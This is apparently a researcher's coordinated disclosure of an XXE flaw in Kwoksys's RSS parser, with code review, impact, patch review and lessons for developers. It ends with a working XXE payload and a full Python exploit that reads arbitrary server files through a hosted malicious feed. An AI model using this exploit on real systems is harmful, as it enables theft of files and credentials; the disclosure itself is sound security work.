---
title: "CVE-2022-45326 - Disclosure"
date: 2022-11-12
---
[CVE-2022-45326](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-45326)

Affecting Kwoksys < v2.9.5.SP31

*Disclosed with permission from the Kwoksys development team*
<hr>

In preparation to take the OSWE (Offensive Security Web Expert) exam, I've been auditing open source projects for security vulnerabilities to augment my studying. One of these open source projects that I stumbled upon was Kwoksys.

Kwoksys is an open source IT management system that provides a centralized system for manging/tracking inventory, software licenses, issues, service contracts, and vendor contacts. Additionally, Kwoksys provides modules for building internal knowledge bases, portals, RSS feeds, and blogs. The project has been actively maintained since 2007 and has been downloaded 86,000+ times at the time of writing this blog post. The project is built on a Tomcat stack and uses a postgresql database for its backend.

I spent a significant amount of time probing the application as an unauthenticated user with little success. The application has a very light unauthenticated presence with very few routes accessible without authentication. My search for authentication bypasses was fruitless

Eventually satisfied with my review of the unauthenticated scope, I decided to switch to probing the application as an authenticated user.

After authenticating to the application we have access to a lot more modules to review. We'll focus on the RSS module.
![Image](/images/2022-11-12-kwoksys-xxe/Pasted image 20221112110829.png)

Kwoksys allows an authenticated and sufficiently privileged user to be able to add a custom RSS feed.

![Image](/images/2022-11-12-kwoksys-xxe/Pasted image 20221112113053.png)

RSS feeds traditionally use XML as the underlying data-interchange format. 

Wikipedia:
*An RSS document (called "feed", "web feed",[4] or "channel") includes full or summarized text, and metadata, like publishing date and author's name. RSS formats are specified using a generic XML file.*

Here's an example of a basic RSS feed in XML format:
```xml
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
	<title>An Awesome Blog</title>
	<link>http://example.com/</link>
	<description>A blog about things</description>
	<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
	<item>
		<title>An Awesome Blog</title>
		<link>http://example.com</link>
		<description>a post</description>
		<author>author@example.com</author>
		<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
	</item>
</channel>
</rss>
```

As a security researcher this is definitely a component that deserves further attention. Since the RSS feed has to support XML data, we can infer that some form of XML parsing is being done server-side. If the XML parser is weakly configured - we might be able to achieve XXE (XML External Entity) injection. For more information on XXE vulnerabilities: [OWASP - XXE](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)

<hr>

### Code Review
Decompiling the kwok-2.9.5.jar in JD-GUI, we see that logic for the RSS parser is contained under com.kwoksys.framework.parsers.rss.

![Image](/images/2022-11-12-kwoksys-xxe/Pasted image 20221112113341.png)

The developers are using standard libraries to perform XML parsing and are using apache axiom libraries for XML modeling. They also appear to have some custom logic for RSS parsing defined in **com.kwoksys.framework.util.XmlUtils**. When reviewing code for vulnerabilities - custom code deserves serious scrutiny. Standard and popular 3rd party libraries are far less likely to contain vulnerabilities than custom code specific to the application being tested. Popular libraries have had more eyes on them and have been battle-tested while code custom to an application may have had a lot less attention and review. However, as we'll find out later in this post - we can't always assume that a third-party library has been brought into an application securely.

Reviewing the custom code for XmlUtils, we see a single method that appears to append an XML version tag to an XML object that is passed to it.
![Image](/images/2022-11-12-kwoksys-xxe/Pasted image 20221112115833.png)

Let's search for calls to the XmlUtils class within our RSS parsing classes to see where this is being done. Our search reveals that XmlUtils is only called one time and it's within the modelToXml class. Based on the class title - we can infer that this class is called when converting a model to XML.
![Image](/images/2022-11-12-kwoksys-xxe/Pasted image 20221112115547.png)

Since this is converting from a model to XML - this custom code is being called after the incoming XML has already been parsed and converted into a model or when the application needs to convert other data into an XML format. This isn't helpful for us - we need to review the code that converts incoming XML to a model as that is where an XXE vulnerability would be present.

Let's more closely review the xmlToModel class which sounds like the process we are looking for.

```java
public void xmlToModel(String xmlString) throws Exception {
    this.xmlString = xmlString;
    this.rssModel = new RssModel();
    StringReader reader = new StringReader(xmlString);
    XMLStreamReader parser = XMLInputFactory.newInstance().createXMLStreamReader(reader);
    StAXOMBuilder stAXOMBuilder = OMXMLBuilderFactory.createStAXOMBuilder(OMAbstractFactory.getOMFactory(), parser);
    OMElement rss = stAXOMBuilder.getDocumentElement();
    OMElement channel = rss.getFirstElement();
    buildChannel(channel);
  }
```

The xmlToModel method takes an XML string in as input and converts it into an instance of the RssModel class. A StringReader object is created from the value of the xmlString input which uses the XMLInputFactory class to create a new XMLStreamReader object. The XMLStreamReader is used to perform the parsing required on the XML string provided.

As we continue to read further into the method - we notice that the rest of the logic relates to the data modeling process - which occurs after our XML input is processed by the parser.

At this point, we need to zero-in on the XMLInputFactory class since that contains the parser logic we are looking for. As we identified earlier, XMLInputFactory is sourced from **javax.xml.stream**. We need to figure out if XMLInputFactory supports external entities by default. We can review Oracle documentation for more information on the XMLInputFactory class. Since we know the newInstance() method is called, let's search for that.

![Image](/images/2022-11-12-kwoksys-xxe/Pasted image 20221112123106.png)

It looks like the newInstance() method performs the same function as the newFactory() method. This is likely a legacy method and is still in-use to maintain backwards-compatability. Let's review the newFactory() method.

![Image](/images/2022-11-12-kwoksys-xxe/Pasted image 20221112123237.png)
Reviewing the constants for XMLInputFactory we find:
![Image](/images/2022-11-12-kwoksys-xxe/Pasted image 20221112124013.png)
![Image](/images/2022-11-12-kwoksys-xxe/Pasted image 20221112124034.png)

Now that we have found the property that configures external entity support - we can review the Oracle documentation to see what the default value is.

![Image](/images/2022-11-12-kwoksys-xxe/Pasted image 20221112124115.png)


According to the documentation, the default value of the isSupportingExternalEntities is "Unspecified". It is unclear what that means or how the application will interpret this. We need to dig deeper into the standard library to understand how this is being implemented.

The openjdk repository on github provides us with the source code for the **XMLInputFactory** class.
[XMLInputFactory.java](https://github.com/openjdk/jdk/blob/master/src/java.xml/share/classes/javax/xml/stream/XMLInputFactory.java)


You can review the source code in-depth at the link provided above. But for the purposes of this blog we will condense the relevant code into one block for easier reading:

#### /src/java.xml/share/classes/javax/xml/stream/XMLInputFactory.java
```java
//CONDENSED

// The XMLInputFactoryImpl is imported
import com.sun.xml.internal.stream.XMLInputFactoryImpl;


// The property of IS_SUPPORTING_EXTERNAL_ENTITIES is set to the value of javax.xml.stream.isSupportingExternalEntities
public static final String IS_SUPPORTING_EXTERNAL_ENTITIES=
"javax.xml.stream.isSupportingExternalEntities";


// A default implementor is set.
static final String DEFAULIMPL = "com.sun.xml.internal.stream.XMLInputFactoryImpl";

// A call to newDefaultFactory() calls XMLInputFactoryImpl() from com.sun.xml.internal.stream.XMLInputFactoryImpl
public static XMLInputFactory newDefaultFactory() {
	return new XMLInputFactoryImpl();
}

// The method to create a new factory using the Default Implementation set earlier.
public static XMLInputFactory newFactory()
	throws FactoryConfigurationError
{
return FactoryFinder.find(XMLInputFactory.class, DEFAULIMPL);
}
```

So now we know that our factory instance is being created based on the implementation of XMLInputFactoryImpl. We now need to review the source code for **com.sun.xml.internal.stream.XMLInputFactoryImpl**

[XMLInputFactoryImpl.java](https://github.com/openjdk/jdk/blob/master/src/java.xml/share/classes/com/sun/xml/internal/stream/XMLInputFactoryImpl.java)
```java
// CONDENSED

// An import for PropertyManager
import com.sun.org.apache.xerces.internal.impl.PropertyManager;

// Factory Implementation for XMLInputFactory - Extends XMLInputFactory.
public class XMLInputFactoryImpl extends javax.xml.stream.XMLInputFactory {

//List of supported properties and default values are set.
private PropertyManager fPropertyManager = new PropertyManager(PropertyManager.CONTEXT_READER) ;
```

Based on the code within XMLInputFactoryImpl - we see that an instance of PropertyManager is created with the argument of PropertyManager.CONTEXT_READER. Once again, we need to review another file to see if the external entity settings are configured.

We will review **com.sun.org.apache.xerces.internal.impl.PropertyManager**

[PropertyManager.java](https://github.com/openjdk/jdk/blob/master/src/java.xml/share/classes/com/sun/org/apache/xerces/internal/impl/PropertyManager.java)
```java
private void initConfigurableReaderProperties() {

//Setting Default Property Values
supportedProps.put(XMLInputFactory.IS_NAMESPACE_AWARE, Boolean.TRUE);
supportedProps.put(XMLInputFactory.IS_VALIDATING, Boolean.FALSE);
supportedProps.put(XMLInputFactory.IS_REPLACING_ENTITY_REFERENCES, Boolean.TRUE);
supportedProps.put(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, Boolean.TRUE);
supportedProps.put(XMLInputFactory.IS_COALESCING, Boolean.FALSE);
supportedProps.put(XMLInputFactory.SUPPORT_DTD, Boolean.TRUE);
supportedProps.put(XMLInputFactory.REPORTER, null);
supportedProps.put(XMLInputFactory.RESOLVER, null);
supportedProps.put(XMLInputFactory.ALLOCATOR, null);
supportedProps.put(STAX_NOTATIONS, null);
```

Great, we can now confirm that the **IS_SUPPORTING_EXTERNAL_ENTITIES** is by default set to TRUE.

Now that we know that the default implementation for new instances of XMLInputFactory has support for external entities enabled. Let's review the Kwoksys source once again.

```java
public void xmlToModel(String xmlString) throws Exception {
    this.xmlString = xmlString;
    this.rssModel = new RssModel();
    StringReader reader = new StringReader(xmlString);
    XMLStreamReader parser = XMLInputFactory.newInstance().createXMLStreamReader(reader);
    StAXOMBuilder stAXOMBuilder = OMXMLBuilderFactory.createStAXOMBuilder(OMAbstractFactory.getOMFactory(), parser);
    OMElement rss = stAXOMBuilder.getDocumentElement();
    OMElement channel = rss.getFirstElement();
    buildChannel(channel);
  }
```

After reviewing the code - there is no manual configuration of the **IS_SUPPORTING_EXTERNAL_ENTITIES** property. As such - the XMLInputFactory will use its default configuration which support external entities. This parser should be vulnerable to XXE.

<hr>

## **Exploitation**

The following XXE payload can be used to confirm our theory
```xml
<!DOCTYPE title [ <!ELEMENT title ANY >
        <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
        <channel>
            <title>Evil Blog</title>
            <link>http://example.com/</link>
            <description>A blog about things</description>
            <lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
            <item>
                <title>&xxe;</title>
                <link>http://example.com</link>
                <description>a post</description>
                <author>author@example.com</author>
                <pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
            </item>
        </channel>
        </rss>
```

If the parser is vulnerable, it will attempt to resolve the external entity "xxe" declared above. Since the external entity points to "file:///etc/passwd", the parser should include the content of the system's /etc/passwd file within the &xxe reference contained in the title tag.

First, we host our malicious xml file on another server:
![Image](/images/2022-11-12-kwoksys-xxe/Pasted image 20221112135504.png)

From within Kwoksys, we add a new RSS feed pointing to our web server
![Image](/images/2022-11-12-kwoksys-xxe/Pasted image 20221112135615.png)

After clicking 'Add', we notice in our web server logs that Kwoksys has reached out for the XML file.
![Image](/images/2022-11-12-kwoksys-xxe/Pasted image 20221112135946.png))

Back on Kwoksys we see that there is a new blog entry which contains the contents of the system's /etc/passwd file in the blog post:
![Image](/images/2022-11-12-kwoksys-xxe/Pasted image 20221112140030.png)

We have successfully exploited an external entity injection vulnerability. By changing the external entity value in the XML payload - we can now arbitrarily read any file on the servers filesystem.

To speed up exploitation, we can build a python script to change the XML payload based on whatever file we specify, trigger a refresh of the RSS feed, then make a follow-up request to retrieve the new blog content and parse the response for the external entity. This provides us with a read-only psuedo shell to the system! Much faster!
![Image](/images/2022-11-12-kwoksys-xxe/Pastedimage20221112141409.png)

<hr>

### Impact

XXE vulnerabilities are included in the OWASP Top 10 and are usually classified as high severity. As we've covered, XXE can be used to arbitrarily retrieve the content of files on the server. Some of these files may contain sensitive information or contain application/service credentials that could help an attacker escalate to RCE. In the event that the underlying application is built with PHP - RCE is directly possible through PHP's expect wrapper: [PHP - From XXE to RCE](https://airman604.medium.com/from-xxe-to-rce-with-php-expect-the-missing-link-a18c265ea4c7)

Another concern related to XXE vulnerabilities is that of SSRF (Server-Side Request Forgery). In the example above we used an external entity to retrieve a local file using the file:// protocol. However, external entities can also point to remote locations such as another web server running on a remote system. When the server attempts to resolve an external entity pointed to a remote system - it will attempt to make a request to that system. This may allow an attacker to make requests on behalf of the Kwoksys server.

As an example, let's say that the Kwoksys system can reach other systems within its internal network that are inaccessible to an attacker. An attacker would be able to leverage XXE to make requests from the Kwoksys server to another server within its internal network. Another option is using a blind time-based approach - where an attacker could use XXE to systematically map out an internal network to see what hosts are alive/responsive based on the time it takes for the server to process an external entity to a remote server and return that response back to the client.

<hr>

### Patch Review

After reporting this to the Kwoksys team - they quickly deployed a patch [2.9.5.SP31] which addresses this. They took the report seriously and had a fix rolled out within days of first contact.
![Image](/images/2022-11-12-kwoksys-xxe/Pasted image 20221112104410.png)

As this is an open source project, let's review the mitigations implemented by the developers.
![Image](/images/2022-11-12-kwoksys-xxe/Pasted image 20221112142936.png)

The developers manually overrided 'IS_SUPPORTING_EXTERNAL_ENTITIES' to false to disable all support for external entities effectively eliminating the XXE vulnerability.

<hr>

### Key Takeaways

From the developer perspective - While much less common nowadays, some XML parsing libraries still have external entity support enabled by default instead of disabled by default. In this case, the default implementation of the XMLInputFactory provided support for external entities and the property was not overrided to false when brought into the application to be used. Whenever XML parsing is required - the usage of external entities should be highly scrutinized. If there isn't a strict business requirement for the functionality, it is safer to fully disable support for external entities. If external entities are needed due to a business requirement - significant validation should be implemented to ensure that users cannot declare new entities themselves, control the entire XML document processed by the server, or use mechanisms like XInclude. You can read more about XXE over at [Portswigger's XXE Reference](https://portswigger.net/web-security/xxe)

From the security research perspective - when hunting for vulnerabilities, your eyes should be drawn to custom code. However, it is important not to neglect standard libraries or popular 3rd party libraries. Ultimately, some libraries can be made insecure depending on how they are brought into an application to be used.

Thank you for reading!

<hr>

### Exploit PoC
```python
#/usr/bin/env python
#
# Exploit Title       : XXE via Crafted RSS Feed
# Author              : navsec
# Vulnerable Software : https://www.kwoksys.com
#
# Usage : KwokSys < v2.9.5.SP31 contains an XXE vulnerability that can be triggered by an
#         authenticated user with privileged access to the RSS module to arbitrarily read files or
#	  conduct SSRF attacks.
          
# DISCLAIMER: This PoC is provided for educational purposes only.

from http.server import SimpleHTTPRequestHandler
import requests, argparse
import urllib.parse
import sys, socketserver, threading, time
import re, html

class kwoksys:
    def __init__(self, url, username, password, LHOST, LPORT) -> None:
        self.url = url
        self.username = username
        self.password = password
        self.LHOST = LHOST
        self.LPORT = LPORT
        self.session = requests.Session()
    def requestHelper(self, path, method, data=""):
        headers = {
            'Host': '172.16.77.21:8080',
            'Pragma': 'no-cache',
            'Cache-Control': 'no-cache',
            'charset': 'utf-8',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36',
            'Content-type': 'application/x-www-form-urlencoded',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'close',
        }

        if method == 'POST':
            response = self.session.post(url=self.url + path, headers=headers, data=data, verify=False)
            return response
        elif method == 'GET':
            response = self.session.get(url=self.url + path, headers=headers, verify=False)
            return response
	   
    # Take user input and modify the payload
    def update_payload(self, file):
        XML_PAYLOAD = '''
        <!DOCTYPE title [ <!ELEMENT title ANY >
        <!ENTITY xxe SYSTEM "file://{}">]>
        <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
        <channel>
            <title>Evil Blog</title>
            <link>http://example.com/</link>
            <description>A blog about things</description>
            <lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
            <item>
                <title>&xxe;</title>
                <link>http://example.com</link>
                <description>a post</description>
                <author>author@example.com</author>
                <pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
            </item>
        </channel>
        </rss>
        '''.format(file)
        try:
            with open('./evil', 'w') as f:
                f.write(XML_PAYLOAD)
        except Exception as e:
            print(e)

    # Try and login using user-supplied credentials
    def login(self):
        data = 'redirectPath=&username=' + self.username + '&password=' + self.password
        resp = self.requestHelper('/kwok/auth/verify-password.htm', 'POST', data)
        return (resp.url)

    # Determine if server is vulnerable.
    def isVulnerable(self):
        print('[+] Checking if Server is Vulnerable....')
        if self.login().endswith('_error=true'):
            print("[x] Login Failed - are the credentials correct?")
            exit()

        print("-- [+] Successfully Authenticated")
        if self.requestHelper('/kwok/rss/feed-add.htm', 'GET').status_code != 200:
            print("-- [X] User does not have valid permissions to RSS Module")
            exit()
        print("-- [+] Permissions are OK")
        print("[o] Server is likely vulnerable - proceeding.")
        return True

    def retrieve(self, requestedFile, feedID):
        self.update_payload(requestedFile)
        data = 'feedId=' + feedID
        data += '&feedUrl=' + urllib.parse.quote_plus('http://' + str(self.LHOST) + ':' + str(self.LPORT) + '/evil')
        data += '&feedName=Evil%20Blog'
        self.requestHelper('/kwok/rss/feed-edit-2.htm', 'POST', data)
        fileResult = self.requestHelper('/kwok/rss/feed-list-items.htm?feedId=' + feedID, 'GET')
        
        rawText = urllib.parse.unquote((fileResult.content.decode()))
        rawText = (html.unescape(rawText))
        if 'Problem retrieving RSS feed' in rawText:
            print("[X] File not found on target")
            return
        else:
            match = re.search(r'rssTitle">(.*)</a></div>', rawText, re.DOTALL)
            if match:
                print(match.group(1))
        
    def setup(self):
        print('[+] Setting up our evil RSS feed')
        # Change to win.ini if Windows
        self.update_payload('/etc/passwd')
        data = 'feedUrl=' + urllib.parse.quote_plus('http://' + str(self.LHOST) + ':' + str(self.LPORT) + '/evil')
        resp = self.requestHelper('/kwok/rss/feed-add-2.htm', 'POST', data)
	
        # Hunt for our newly created feed ID
        for id in range(0,100):
            result = self.requestHelper('/kwok/rss/feed-edit.htm?feedId=' + str(id), 'GET')
            if (not 'Object Not Found' in str(result.content)):
                if ('Evil Blog' in str(result.content)):
                    feedID = str(id)
                    print("[+] Found our evil RSS feed at ID: " + feedID)
                    return feedID
        print("[+] Could not find feed ID")
        exit()

class EvilHandler(SimpleHTTPRequestHandler):
    # Overload log_message method to suppress access logs from being sent to stdout
    def log_message(self, format, *args):
        logging = False

def StartServer(PORT):
    with socketserver.TCPServer(("", PORT), EvilHandler) as httpd:
        print("[+] Payload Delivery Server now Listening ---> 0.0.0.0:{}".format(PORT))
        httpd.serve_forever()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--url', '-b', required=True, dest='base_url', help='Kwoksys Base URL')
    parser.add_argument('--user', '-u', required=True, dest='username', help='Username')
    parser.add_argument('--password', '-p', required=True, dest='password', help='Password')
    parser.add_argument('--mode', '-m', required=True, dest='mode', help='Mode')
    parser.add_argument('--LHOST', '-lh', required=True, dest='LHOST', help='Local Address to Serve Payload from')
    parser.add_argument('--LPORT', '-lp', required=True, dest='LPORT', help='Local Port to Serve Payload from')

    args = parser.parse_args()
    client = kwoksys(args.base_url, args.username, args.password, args.LHOST, args.LPORT)
    if client.isVulnerable():
        threading.Thread(target=StartServer, args=(int(args.LPORT),)).start()
        time.sleep(1)
        feedID = client.setup()
    if args.mode == 'read_files':
        while True:
            requestedFile = input('File (Full Path):')
            client.retrieve(requestedFile, feedID)
```
